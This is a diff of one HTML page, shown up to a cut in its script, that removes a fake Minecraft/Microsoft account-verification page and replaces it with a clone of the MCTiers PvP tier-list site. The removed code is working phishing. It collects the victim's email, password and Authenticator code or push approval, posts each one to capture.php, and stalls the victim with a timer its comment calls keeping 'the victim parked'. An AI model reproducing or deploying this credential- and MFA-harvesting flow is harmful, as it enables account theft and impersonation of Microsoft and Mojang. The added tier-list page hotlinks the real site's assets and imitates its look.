@@ -1,150 +1,536 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Account Verification | Minecraft</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#ff0000">
+<title>MCTiers - Minecraft PvP Tier List &amp; Player Rankings</title>
+<link rel="icon" href="https://mctiers.gg/favicon.ico">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-:root{--bg:#0d0d0d;--card:#1b1b1b;--line:#2e2e2e;--in:#262626;--green:#3c8527;--green-h:#4a9e30}
-body{font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);
- color:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;
- justify-content:center;padding:20px}
-body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.5;
- background-image:repeating-linear-gradient(0deg,rgba(255,255,255,.028) 0 2px,transparent 2px 4px),
- repeating-linear-gradient(90deg,rgba(0,0,0,.16) 0 2px,transparent 2px 4px)}
-.logo{width:min(300px,72vw);height:auto;mix-blend-mode:screen;position:relative;z-index:1;margin-bottom:16px}
-.card{position:relative;z-index:1;background:var(--card);border:2px solid var(--line);width:100%;
- max-width:410px;padding:28px 26px;box-shadow:0 8px 0 rgba(0,0,0,.45)}
-.steps{display:flex;gap:6px;margin-bottom:20px}
-.steps i{flex:1;height:4px;background:#333}
-.steps i.on{background:var(--green)}
-.badge{display:flex;align-items:center;gap:8px;font-family:monospace;font-size:11px;
- letter-spacing:1.4px;text-transform:uppercase;color:#7fc95f;margin-bottom:12px}
-.badge svg{width:14px;height:14px;flex:none}
-h1{font-family:monospace;font-size:16px;letter-spacing:1.6px;text-transform:uppercase;
- margin-bottom:8px;text-shadow:2px 2px 0 #000}
-.sub{font-size:13px;color:#9d9d9d;margin-bottom:18px;line-height:1.55}
-.sub b{color:#d8d8d8;word-break:break-all}
-label{display:block;font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#8f8f8f;
- margin-bottom:6px;font-family:monospace}
-input{width:100%;height:40px;background:var(--in);border:2px solid #3a3a3a;color:#fff;padding:0 10px;
- font-size:15px;font-family:inherit;outline:none;margin-bottom:12px}
-input:focus{border-color:var(--green);background:#2b2b2b}
-input::placeholder{color:#6a6a6a}
-.err{color:#ff6b5e;font-size:12px;min-height:16px;margin:-6px 0 8px;font-family:monospace}
-.btn{width:100%;height:42px;background:var(--green);color:#fff;border:0;border-bottom:4px solid #24541a;
- font-family:monospace;font-size:14px;letter-spacing:1.4px;text-transform:uppercase;font-weight:700;
- cursor:pointer;margin-top:4px}
-.btn:hover{background:var(--green-h)}
-.btn:active{border-bottom-width:1px;transform:translateY(3px)}
-.btn.ghost{background:#2a2a2a;border-bottom-color:#111;color:#d0d0d0}
-.btn.ghost:hover{background:#333}
-.row{display:flex;gap:8px}.row .btn{margin-top:0}
-.link{display:block;text-align:center;color:#8fb9ff;font-size:12.5px;text-decoration:none;margin-top:14px;
- font-family:monospace}
-.link:hover{text-decoration:underline}
-.back{background:none;border:0;color:#8f8f8f;cursor:pointer;font-family:monospace;font-size:11px;
- letter-spacing:1px;text-transform:uppercase;margin-bottom:12px;padding:0}
-.back:hover{color:#fff}
-.note{background:#232323;border-left:3px solid #4a9e30;padding:10px 12px;font-size:12.5px;
- color:#b4b4b4;line-height:1.5;margin-bottom:14px}
-.spin{display:inline-block;width:13px;height:13px;border:2px solid rgba(255,255,255,.35);
- border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite;vertical-align:-2px;margin-right:7px}
-@keyframes s{to{transform:rotate(360deg)}}
-.track{height:10px;background:#2a2a2a;border:2px solid #333;margin:18px 0 10px;overflow:hidden}
-.bar{height:100%;width:0;background:linear-gradient(90deg,#3c8527,#7fc95f);transition:width .9s linear}
-.pmsg{font-family:monospace;font-size:12px;color:#8f8f8f;text-align:center;min-height:18px}
-.timer{font-family:monospace;font-size:11px;color:#5e5e5e;text-align:center;margin-top:8px;letter-spacing:1px}
-.ok{width:64px;height:64px;margin:6px auto 16px;border:3px solid #4a9e30;border-radius:50%;
- display:flex;align-items:center;justify-content:center;animation:pop .35s ease-out}
-.ok svg{width:30px;height:30px;stroke:#7fc95f;stroke-width:4;fill:none;stroke-linecap:round}
-@keyframes pop{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
-footer{position:relative;z-index:1;margin-top:24px;text-align:center;font-size:11px;color:#5e5e5e;
- font-family:monospace;line-height:1.9}
-footer a{color:#6f6f6f;text-decoration:none}
-@media(max-width:420px){body{padding:0;justify-content:flex-start;padding-top:30px}
- .card{max-width:none;border-left:0;border-right:0;padding:24px 20px}}
+:root{
+  --bg:#0a0a0a; --card:#141414; --accent:#1c1c1c; --border:#272727;
+  --fg:#e8e8e8; --muted:#8a8a8a; --dim:#5c5c5c; --primary:#d92632;
+  --tier-1:#ffd34d; --tier-1-fg:#2b1f00;
+  --tier-2:#d7dde3; --tier-2-fg:#1a1d20;
+  --tier-3:#d08a4e; --tier-3-fg:#2a1500;
+  --tier-4:#8d949c; --tier-4-fg:#101315;
+  --tier-5:#5f666e; --tier-5-fg:#0c0e10;
+  --ht1:#ffd34d; --ht1-fg:#2b1f00;
+  --lt1:#e8b93a; --lt1-fg:#2b1f00;
+  --ht2:#e4e9ee; --ht2-fg:#1a1d20;
+  --lt2:#b9c1c9; --lt2-fg:#1a1d20;
+  --ht3:#e0975a; --ht3-fg:#2a1500;
+  --lt3:#b8763c; --lt3-fg:#2a1500;
+  --ht4:#9aa2aa; --ht4-fg:#101315;
+  --lt4:#787f87; --lt4-fg:#0c0e10;
+  --ht5:#6b737b; --ht5-fg:#0c0e10;
+  --lt5:#525961; --lt5-fg:#0c0e10;
+  --other:#3a3a3a;
+  --na:#2c3440; --na-fg:#c3d0e0;
+  --eu:#2c3a2c; --eu-fg:#b8dcb8;
+}
+body{background:var(--bg);color:var(--fg);
+  font:15px/1.5 "Geist",ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  min-height:100vh;display:flex;flex-direction:column}
+a{color:inherit;text-decoration:none}
+img{display:block}
+.wrap{width:100%;max-width:1352px;margin:0 auto;padding:0 16px}
+
+/* header */
+header{position:sticky;top:0;z-index:50;background:rgba(10,10,10,.86);
+  backdrop-filter:blur(12px);border-bottom:2px solid var(--border)}
+nav{max-width:1352px;margin:0 auto;height:64px;display:flex;align-items:center;gap:4px;padding:0 16px}
+.logo img{height:34px;width:auto}
+.nav-links{display:flex;align-items:center;gap:2px;margin-left:18px}
+.nav-links a,.nav-links span{display:flex;align-items:center;gap:7px;padding:8px 10px;
+  font-size:15px;font-weight:500;color:var(--muted);cursor:pointer;border-radius:6px}
+.nav-links a:hover,.nav-links span:hover{color:#fff}
+.nav-links a.on{color:#fff}
+.nav-links img{height:20px;width:auto;opacity:.85}
+.search{margin-left:auto;display:flex;align-items:center;gap:8px;background:var(--accent);
+  border-radius:999px;height:40px;padding:0 12px}
+.search svg{width:18px;height:18px;fill:var(--muted);flex:none}
+.search input{background:none;border:0;outline:none;color:#fff;font:14px inherit;width:170px}
+.search input::placeholder{color:var(--dim)}
+.search kbd{background:#2a2a2a;color:var(--muted);border-radius:5px;padding:2px 6px;font-size:11px}
+@media(max-width:1000px){.nav-links{display:none}.search input{width:120px}}
+
+/* generic */
+main{flex:1;padding:32px 0 64px}
+.card{background:var(--card);border:2px solid var(--border);border-radius:12px}
+h1{font-size:34px;font-weight:800;letter-spacing:-.02em;line-height:1.15}
+h2{font-size:22px;font-weight:700;color:#d6d6d6}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:18px}
+.sec-head .more{font-size:14px;color:var(--muted);display:flex;align-items:center;gap:6px}
+.sec-head .more:hover{color:#fff}
+.muted{color:var(--muted)}
+.btn{display:inline-flex;align-items:center;gap:9px;height:48px;padding:0 20px;border-radius:9px;
+  font-weight:700;border:0;cursor:pointer;font-size:15px;font-family:inherit}
+.btn.primary{background:var(--primary);color:#fff}
+.btn.primary:hover{filter:brightness(1.12)}
+.btn.ghost{background:var(--accent);color:#e2e2e2;border:2px solid var(--border)}
+.btn.ghost:hover{background:#242424}
+
+/* hero */
+.hero{display:grid;grid-template-columns:1fr 1.05fr;overflow:hidden;position:relative;margin-top:8px}
+.hero::after{content:"";position:absolute;inset:0;pointer-events:none;
+  background:radial-gradient(560px 320px at 8% -10%,rgba(255,211,77,.10),transparent 70%),
+             radial-gradient(520px 300px at 100% 110%,rgba(56,132,255,.10),transparent 70%)}
+.hero-l,.hero-r{position:relative;padding:40px}
+.hero-l{display:flex;flex-direction:column;justify-content:center;gap:20px}
+.hero-l img.hlogo{width:min(400px,100%);height:auto}
+.hero-r{border-left:2px solid var(--border)}
+@media(max-width:900px){.hero{grid-template-columns:1fr}.hero-r{border-left:0;border-top:2px solid var(--border)}.hero-l,.hero-r{padding:26px}}
+
+/* top player cards */
+.tp{display:flex;align-items:center;gap:8px;height:78px;background:rgba(255,255,255,.04);
+  border:2px solid var(--border);border-radius:12px;margin-bottom:8px;overflow:hidden;
+  transition:transform .15s,background .15s}
+.tp:hover{background:var(--accent);transform:translateX(-6px)}
+.tp .plate{position:relative;width:150px;height:56px;flex:none;overflow:hidden;border-radius:4px;margin-left:8px}
+.tp .plate .shim{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.tp .plate .n{position:absolute;left:8px;bottom:0;font-size:32px;font-weight:800;font-style:italic;
+  text-shadow:0 3px 1px #232323}
+.tp .plate .skin{position:absolute;right:22px;bottom:0;width:56px;height:56px;
+  image-rendering:pixelated;filter:drop-shadow(-4px -2px 1px #00000077)}
+.tp .who{min-width:0;flex:1;padding-right:8px}
+.tp .who .nm{font-size:20px;font-weight:700;color:#d3d3d3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tp .who .tt{display:flex;align-items:center;gap:6px;font-size:13px;color:#9a9a9a}
+.tp .who .tt img{width:20px;height:20px;object-fit:contain}
+.tp .reg{width:38px;height:38px;flex:none;display:grid;place-items:center;border-radius:7px;
+  font-weight:800;font-size:14px;margin-right:14px;background:var(--other);color:#ddd}
+.reg.na{background:var(--na);color:var(--na-fg)}
+.reg.eu{background:var(--eu);color:var(--eu-fg)}
+.tp .tiers{display:flex;gap:2px;padding:0 8px 8px;flex-wrap:wrap}
+@media(max-width:560px){.tp .reg{display:none}}
+
+/* tier badge */
+.tb{width:38px;display:flex;flex-direction:column;align-items:center;gap:2px}
+.tb .ic{width:30px;height:30px;border-radius:999px;background:rgba(0,0,0,.55);
+  border:2px solid var(--other);display:grid;place-items:center}
+.tb .ic img{width:17px;height:17px}
+.tb b{font-size:12px;line-height:1;padding:3px 0;width:34px;text-align:center;
+  border-radius:8px;background:var(--other);color:#eee;font-weight:700}
+.tb[data-c] .ic{border-color:var(--c)}
+.tb[data-c] b{background:var(--c);color:var(--cf)}
+
+/* server bar */
+.sbar{display:flex;flex-wrap:wrap;align-items:center;gap:28px;padding:18px 26px;
+  border-top:2px solid var(--border);background:rgba(0,0,0,.2)}
+.ipbtn{display:flex;align-items:center;gap:12px;background:var(--accent);border:0;
+  border-radius:9px;padding:10px 10px 10px 16px;cursor:pointer;color:#fff;font-weight:700;font-size:16px}
+.ipbtn:hover{background:#242424}
+.ipbtn .cp{width:26px;height:26px;border-radius:6px;background:rgba(0,0,0,.25);
+  display:grid;place-items:center;color:var(--muted)}
+.ipbtn .cp svg{width:13px;height:13px;fill:currentColor}
+.dot{width:10px;height:10px;border-radius:999px;background:#22c55e;position:relative}
+.dot::after{content:"";position:absolute;inset:0;border-radius:999px;background:#22c55e;
+  animation:ping 1.6s ease-out infinite}
+@keyframes ping{to{transform:scale(2.2);opacity:0}}
+
+/* gamemodes */
+.modes{display:grid;grid-template-columns:repeat(8,1fr);gap:10px}
+@media(max-width:1000px){.modes{grid-template-columns:repeat(4,1fr)}}
+.mode{display:flex;flex-direction:column;align-items:center;gap:10px;padding:22px 8px;
+  background:var(--card);border:2px solid var(--border);border-radius:12px;transition:.15s}
+.mode:hover{background:var(--accent);border-color:#4a4a4a}
+.mode .box{width:58px;height:58px;border-radius:11px;background:rgba(0,0,0,.25);
+  border:2px solid #3a3a3a;display:grid;place-items:center}
+.mode:hover .box{border-color:#8a8a8a}
+.mode .box img{width:32px;height:32px;transition:transform .15s}
+.mode:hover .box img{transform:scale(1.2)}
+.mode span{font-weight:700;color:#c9c9c9;font-size:14px}
+.mode:hover span{color:#fff}
+
+/* tiers & points table */
+.tp-grid{display:grid;grid-template-columns:1.2fr 1fr;gap:14px}
+@media(max-width:900px){.tp-grid{grid-template-columns:1fr}}
+.tierrow{height:48px;border-radius:9px;display:flex;align-items:center;gap:9px;
+  padding:0 14px;font-weight:700;margin-bottom:7px}
+.tierrow img{width:20px;height:20px}
+.tierrow .pts{margin-left:auto;display:flex;gap:6px;font-size:11px;font-weight:600}
+.tierrow .pts span{display:flex;align-items:center;gap:3px;background:rgba(0,0,0,.22);
+  border-radius:999px;padding:3px 8px}
+.tierrow .pts svg{width:13px;height:13px;fill:currentColor}
+
+/* title ladder */
+.tl{display:flex;align-items:center;gap:11px;margin-bottom:13px}
+.tl img{width:24px;height:24px;flex:none}
+.tl .bar{height:5px;border-radius:999px;background:rgba(0,0,0,.35);margin-top:5px;overflow:hidden}
+.tl .bar i{display:block;height:100%;border-radius:999px}
+.tl .lbl{display:flex;justify-content:space-between;gap:10px;font-size:13px;font-weight:600}
+.tl .lbl span:last-child{font-size:11px;color:var(--muted);font-weight:400}
+.tl .grow{flex:1;min-width:0}
+
+/* rankings table */
+.rtable{width:100%;border-collapse:collapse}
+.rtable th{text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.08em;
+  color:var(--dim);padding:12px 10px;border-bottom:2px solid var(--border);font-weight:700}
+.rtable td{padding:10px;border-bottom:1px solid #1c1c1c;vertical-align:middle}
+.rtable tr:hover td{background:rgba(255,255,255,.025)}
+.rtable .rk{font-size:15px;font-weight:800;color:var(--dim);width:46px;font-style:italic}
+.rtable tr:nth-child(1) .rk{color:var(--tier-1)}
+.rtable tr:nth-child(2) .rk{color:var(--tier-2)}
+.rtable tr:nth-child(3) .rk{color:var(--tier-3)}
+.pcell{display:flex;align-items:center;gap:10px;min-width:0}
+.pcell img.sk{width:38px;height:38px;image-rendering:pixelated;border-radius:3px;flex:none}
+.pcell .nm{font-weight:700;font-size:15px;color:#dcdcdc;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.pcell .tt{font-size:11.5px;color:#7d7d7d;display:flex;align-items:center;gap:5px}
+.pcell .tt img{width:14px;height:14px}
+.tset{display:flex;gap:2px;flex-wrap:wrap}
+
+/* notice + faq */
+.notice{display:flex;gap:10px;align-items:center;padding:12px 16px;border-radius:9px;
+  background:#1a1a1a;border:2px solid var(--border);color:#a8a8a8;font-size:13px;margin-bottom:16px}
+.notice b{color:#ddd}
+details{border-bottom:2px solid var(--border);padding:16px 20px;cursor:pointer}
+details:last-child{border-bottom:0}
+details summary{list-style:none;display:flex;align-items:center;gap:14px;font-weight:600;color:#cfcfcf}
+details summary::-webkit-details-marker{display:none}
+details summary .num{color:var(--dim);font-size:12px;font-variant-numeric:tabular-nums}
+details summary .pm{margin-left:auto;width:26px;height:26px;border-radius:7px;background:var(--accent);
+  display:grid;place-items:center;color:var(--muted);transition:.2s;flex:none}
+details[open] summary .pm{transform:rotate(45deg);background:var(--tier-1);color:var(--tier-1-fg)}
+details p{margin:12px 0 0 34px;color:var(--muted);font-size:14px;line-height:1.7;max-width:75ch}
+details[open]{background:rgba(255,255,255,.02);box-shadow:inset 3px 0 0 var(--tier-1)}
+
+/* footer */
+footer{border-top:2px solid var(--border);background:#0c0c0c;padding:48px 0 26px;margin-top:56px}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr .6fr;gap:44px}
+@media(max-width:800px){.fgrid{grid-template-columns:1fr 1fr}}
+footer p.desc{color:#8d8d8d;max-width:34ch;margin:14px 0}
+footer .fhead{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--dim);
+  font-weight:700;margin-bottom:14px}
+footer ul{list-style:none;display:grid;gap:9px}
+footer ul.two{grid-template-columns:1fr 1fr;gap:9px 20px}
+footer li a{color:#8d8d8d;font-size:14px;display:flex;align-items:center;gap:7px}
+footer li a:hover{color:#fff}
+footer li a img{width:14px;height:14px;opacity:.8}
+.fbot{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;
+  border-top:2px solid var(--border);margin-top:34px;padding-top:18px;font-size:13px;color:var(--dim)}
+
+/* toast */
+#toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,120%);z-index:200;
+  background:#1d1d1d;border:2px solid #333;border-radius:9px;padding:11px 18px;font-size:14px;
+  transition:transform .25s;pointer-events:none}
+#toast.on{transform:translate(-50%,0)}
+.empty{padding:60px 20px;text-align:center;color:var(--dim)}
 </style>
 </head>
 <body>
 
-<img src="logo.png" class="logo" alt="Minecraft" onerror="this.style.display='none'">
-
-<div class="card">
-  <div class="steps"><i class="on" id="s1"></i><i id="s2"></i><i id="s3"></i></div>
-
-  <!-- 1 -->
-  <div id="step1">
-    <div class="badge">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#7fc95f" stroke-width="2.4"><path d="M12 2l8 3v6c0 5-3.4 9.3-8 11-4.6-1.7-8-6-8-11V5l8-3z"/></svg>
-      Verification required
+<header>
+  <nav>
+    <a class="logo" href="#/"><img src="https://mctiers.gg/icons/nav_skip.png" alt="MCTiers"></a>
+    <div class="nav-links">
+      <a href="#/" id="nav-home"><img src="https://mctiers.gg/nav_icons/home.svg" alt="">Home</a>
+      <a href="#/rankings/overall" id="nav-rank"><img src="https://mctiers.gg/nav_icons/rankings.svg" alt="">Rankings</a>
+      <span><img src="https://mctiers.gg/nav_icons/discord.svg" alt="">Discords</span>
+      <a href="#/server"><img src="https://mctiers.gg/nav_icons/server.svg" alt="">Server IP</a>
+      <span><img src="https://mctiers.gg/nav_icons/events.svg" alt="">Events</span>
     </div>
-    <h1>Verify your account</h1>
-    <p class="sub">Your Minecraft account needs to be verified to keep playing. Confirm ownership with your <b>Microsoft</b> account.</p>
-    <label for="email">Email address</label>
-    <input id="email" type="email" placeholder="you@example.com" autocomplete="username" spellcheck="false">
-    <p class="err" id="e1"></p>
-    <button class="btn" onclick="next()">Continue</button>
-  </div>
+    <div class="search">
+      <svg viewBox="0 0 24 24"><path d="M10 18a7.95 7.95 0 0 0 4.9-1.69l4.4 4.4 1.4-1.4-4.4-4.4A8 8 0 1 0 10 18zm0-14a6 6 0 1 1 0 12 6 6 0 0 1 0-12z"/></svg>
+      <input id="q" placeholder="Search player..." aria-label="Search player">
+      <kbd>/</kbd>
+    </div>
+  </nav>
+</header>
 
-  <!-- 2 -->
-  <div id="step2" hidden>
-    <button class="back" onclick="back()">&#8592; Back</button>
-    <h1>Confirm password</h1>
-    <p class="sub"><b id="shownEmail"></b></p>
-    <label for="pass">Password</label>
-    <input id="pass" type="password" placeholder="Password" autocomplete="current-password">
-    <p class="err" id="e2"></p>
-    <button class="btn" onclick="submitPass(this)">Verify</button>
-    <a class="link" href="#">Forgot password?</a>
-  </div>
+<main class="wrap" id="app"></main>
 
-  <!-- 3 -->
-  <div id="step3" hidden>
-    <h1>Security check</h1>
-    <div class="note">Open your <b>Microsoft Authenticator</b> app and <b>approve the request</b>, or type the 6-digit code shown in the app.</div>
-    <label for="code">Verification code</label>
-    <input id="code" type="text" inputmode="numeric" maxlength="8" placeholder="000000" autocomplete="one-time-code">
-    <p class="err" id="e3"></p>
-    <div class="row">
-      <button class="btn ghost" onclick="skip()">Approve on phone</button>
-      <button class="btn" onclick="submitCode(this)">Submit</button>
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <img src="https://mctiers.gg/icons/nav_skip.png" style="height:30px" alt="MCTiers">
+        <p class="desc">The Minecraft PvP tier list. Rankings, tier tests and events for Java and Bedrock players.</p>
+        <button class="ipbtn" data-ip="playmctiers.com">
+          playmctiers.com
+          <span class="cp"><svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1z"/></svg></span>
+        </button>
+        <p class="muted" style="font-size:12px;margin-top:8px">Java 1.21 - 26.3 · Bedrock</p>
+      </div>
+      <div>
+        <p class="fhead">Rankings</p>
+        <ul class="two" id="foot-modes"></ul>
+      </div>
+      <div>
+        <p class="fhead">Explore</p>
+        <ul>
+          <li><a href="#/server">Server IP</a></li>
+          <li><a href="#">Events</a></li>
+          <li><a href="#">Guides</a></li>
+          <li><a href="#faq">FAQ</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fbot">
+      <p>© 2026 MCTiers. All rights reserved.</p>
+      <p>Not an official Minecraft product. Not approved by or associated with Mojang or Microsoft.</p>
     </div>
   </div>
+</footer>
 
-  <!-- 4: the hold -->
-  <div id="step4" hidden>
-    <h1>Verifying your account</h1>
-    <p class="sub">Please keep this window open. Do <b>not</b> close it or log in again while verification runs.</p>
-    <div class="track"><div class="bar" id="bar"></div></div>
-    <p class="pmsg" id="pmsg">Checking account ownership&hellip;</p>
-    <p class="timer" id="timer"></p>
-  </div>
-
-  <!-- 5: done -->
-  <div id="step5" hidden>
-    <div class="ok"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 7"/></svg></div>
-    <h1 style="text-align:center">Verification complete</h1>
-    <p class="sub" style="text-align:center">Your account has been verified. Redirecting you back to Minecraft&hellip;</p>
-  </div>
-</div>
-
-<footer>Need help? <a href="#">Contact support</a><br>&copy; 2026 Mojang Synergies AB</footer>
+<div id="toast"></div>
 
 <script>
-var HOLD = 150; // seconds to keep the victim parked (raise for slower hands)
-var EMAIL='', RE=/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i;
+const ICON = m => `https://mctiers.gg/tier_icons/${m}.svg`;
+const MODES = [
+  ['vanilla','Vanilla'],['uhc','UHC'],['pot','Pot'],['nethop','NethOP'],
+  ['smp','SMP'],['sword','Sword'],['axe','Axe'],['mace','Mace']
+];
+const PTS = {HT1:60,LT1:45,HT2:30,LT2:20,HT3:10,LT3:6,HT4:4,LT4:3,HT5:2,LT5:1};
 
-function send(d){try{fetch('capture.php',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify(d),keepalive:true});}catch(e){}}
-function hideAll(){for(var i=1;i<=5;i++)document.getElementById('step'+i).hidden=true;}
-function mark(n){document.getElementById('s1').className=n>=1?'on':'';
-  document.getElementById('s2').className=n>=2?'on':'';
-  document.getElementById('s3').className=n>=3?'on':'';}
-function err(id,t){document.getElementById(id).textContent=t;}
+/* ---- data (static, edit freely) ---- */
+const PLAYERS = [
+  {name:'Marlowww',  reg:'NA', title:'Combat Grandmaster', pts:450, t:{nethop:'HT1',mace:'HT1',smp:'HT1',vanilla:'HT1',sword:'HT1',pot:'HT1',uhc:'LT1',axe:'LT1'}},
+  {name:'ItzRealMe', reg:'NA', title:'Combat Master',      pts:330, t:{sword:'HT3',vanilla:'HT1',pot:'HT1',nethop:'HT1',smp:'HT1',axe:'LT2',uhc:'LT2',mace:'LT2'}},
+  {name:'coldified', reg:'EU', title:'Combat Master',      pts:326, t:{pot:'LT1',vanilla:'LT3',uhc:'HT1',smp:'HT1',sword:'LT1',mace:'LT1',axe:'LT1',nethop:'LT2'}},
+  {name:'Swight',    reg:'NA', title:'Combat Master',      pts:290, t:{vanilla:'LT3',axe:'HT1',smp:'HT1',uhc:'HT1',nethop:'HT2',mace:'LT2',sword:'LT2',pot:'LT2'}},
+  {name:'janekv',    reg:'EU', title:'Combat Master',      pts:260, t:{mace:'LT3',vanilla:'HT4',nethop:'HT1',smp:'HT1',pot:'HT1',sword:'HT2',uhc:'LT2',axe:'LT2'}},
+  {name:'BlvckWlf',  reg:'EU', title:'Combat Ace',         pts:226, t:{sword:'HT3',nethop:'LT3',vanilla:'LT3',uhc:'HT1',smp:'HT1',mace:'HT2',axe:'HT2',pot:'LT2'}},
+  {name:'Kylaz',     reg:'NA', title:'Combat Ace',         pts:226, t:{smp:'HT3',uhc:'LT3',vanilla:'LT3',pot:'HT1',sword:'HT1',nethop:'HT1',axe:'LT2'}},
+  {name:'ninorc15',  reg:'EU', title:'Combat Ace',         pts:196, t:{smp:'HT3',uhc:'HT3',axe:'HT3',vanilla:'LT3',sword:'LT2',pot:'LT2',mace:'LT2',nethop:'LT2'}},
+  {name:'Lurrn',     reg:'EU', title:'Combat Ace',         pts:186, t:{uhc:'LT3',axe:'LT4',pot:'HT1',nethop:'HT1',vanilla:'HT2',sword:'LT2'}},
+  {name:'Arsakha',   reg:'ME', title:'Combat Ace',         pts:177, t:{uhc:'HT3',axe:'HT3',pot:'HT3',sword:'LT3',nethop:'LT3',vanilla:'LT3',mace:'LT3',smp:'HT1'}},
+  {name:'Exxil',     reg:'EU', title:'Combat Specialist',  pts:88,  t:{sword:'HT4',pot:'LT4',vanilla:'HT5',axe:'LT5'}},
+  {name:'Nyxar',     reg:'NA', title:'Combat Cadet',       pts:34,  t:{smp:'LT4',sword:'LT5',uhc:'LT5'}},
+  {name:'Korvex',    reg:'AS', title:'Combat Novice',      pts:14,  t:{pot:'HT5',vanilla:'LT5'}},
+  {name:'Vantel',    reg:'SA', title:'Rookie',             pts:6,   t:{mace:'LT5'}}
+];
 
-function next(){
-  var v=document.getElementById('email').value.trim();
-  if(!RE.test(v)){err('e1','Enter a valid email address.');return;}
-  EMAIL=v; send({
+const TIERS = [
+  [1,'HT1 · 60pts','LT1 · 45pts'],[2,'HT2 · 30pts','LT2 · 20pts'],[3,'HT3 · 10pts','LT3 · 6pts'],
+  [4,'HT4 · 4pts','LT4 · 3pts'],[5,'HT5 · 2pts','LT5 · 1pts']
+];
+const TITLES = [
+  ['combat_grandmaster','Combat Grandmaster','400+ points','#fde047',100],
+  ['combat_master','Combat Master','250+ points','#fde047',79],
+  ['combat_ace','Combat Ace','100+ points','#fda4af',50],
+  ['combat_specialist','Combat Specialist','50+ points','#d8b4fe',35],
+  ['combat_cadet','Combat Cadet','20+ points','#c4b5fd',22],
+  ['combat_novice','Combat Novice','10+ points','#c4b5fd',16],
+  ['rookie','Rookie','Under 10 points','#d1d5db',6]
+];
+const FAQ = [
+  ['What is MCTiers?','MCTiers is a Minecraft PvP tier list. It ranks players in eight gamemodes (Vanilla/Crystal PvP, UHC, Pot, NethOP, SMP, Sword, Axe and Mace) from High Tier 1 to Low Tier 5, and combines those tiers into one overall leaderboard.'],
+  ['What do HT1, LT1 and the other tiers mean?','Each gamemode has five tiers, and Tier 1 is the best. Every tier is split into High (HT) and Low (LT), so HT1 is the highest rank a player can hold and LT5 the lowest. The full order is HT1, LT1, HT2, LT2 and so on down to LT5.'],
+  ['How do I get tier tested?','Join playmctiers.com on Java or Bedrock and type /tiertest. Choose the gamemode you want to be ranked in and your region to join that gamemode\'s testing queue. When a tester in your region is free, you\'re moved to a private arena with the official kit, and your tier is added to your MCTiers profile after the test.'],
+  ['How is the overall leaderboard calculated?','Every tier is worth points: HT1 60, LT1 45, HT2 30, LT2 20, HT3 10, LT3 6, HT4 4, LT4 3, HT5 2 and LT5 1. A player\'s points from all gamemodes are added together and the overall leaderboard is sorted by that total. When a player has reached a higher peak tier, the peak is what counts.'],
+  ['What are titles like Combat Master?','Titles reflect a player\'s total points: Rookie below 10 points, Combat Novice from 10, Combat Cadet from 20, Combat Specialist from 50, Combat Ace from 100, Combat Master from 250 and Combat Grandmaster from 400.'],
+  ['What is the MCTiers server IP?','The MCTiers Minecraft server is at playmctiers.com. Java players can join on any version from 1.21 - 26.3, and Bedrock players use the same address with port 19132.']
+];
+
+/* ---- helpers ---- */
+const skin = n => `https://mc-heads.net/avatar/${encodeURIComponent(n)}/64`;
+const key = t => t.replace(/(HT|LT)/,'').replace('1','1'); // no-op guard
+
+function badge(mode, tier){
+  const isHT = tier.startsWith('HT');
+  const v = `--c:var(--${tier.toLowerCase()});--cf:var(--${tier.toLowerCase()}-fg)`;
+  return `<span class="tb" data-c style="${v}">
+    <span class="ic"><img src="${ICON(mode)}" alt="${mode}" loading="lazy"></span>
+    <b>${tier}</b></span>`;
+}
+function tierSet(t){
+  return Object.entries(t).map(([m,v]) => badge(m,v)).join('');
+}
+function toast(msg){
+  const el = document.getElementById('toast');
+  el.textContent = msg; el.classList.add('on');
+  clearTimeout(el._t); el._t = setTimeout(()=>el.classList.remove('on'),1600);
+}
+
+/* ---- views ---- */
+function viewHome(){
+  const top = PLAYERS.slice(0,3).map((p,i)=>`
+    <a class="tp" href="#/rankings/overall">
+      <span class="plate">
+        <img class="shim" src="https://mctiers.gg/placements/${i+1}-shimmer.svg" alt="">
+        <span class="n">${i+1}.</span>
+        <img class="skin" src="${skin(p.name)}" alt="">
+      </span>
+      <span class="who">
+        <p class="nm">${p.name}</p>
+        <p class="tt"><img src="https://mctiers.gg/titles/${TITLES.find(t=>t[1]===p.title)[0]}.webp" alt="">
+          ${p.title} <span class="muted">(${p.pts} points)</span></p>
+      </span>
+      <span class="reg ${p.reg.toLowerCase()}">${p.reg}</span>
+    </a>
+    <div class="tiers">${tierSet(p.t)}</div>`).join('');
+
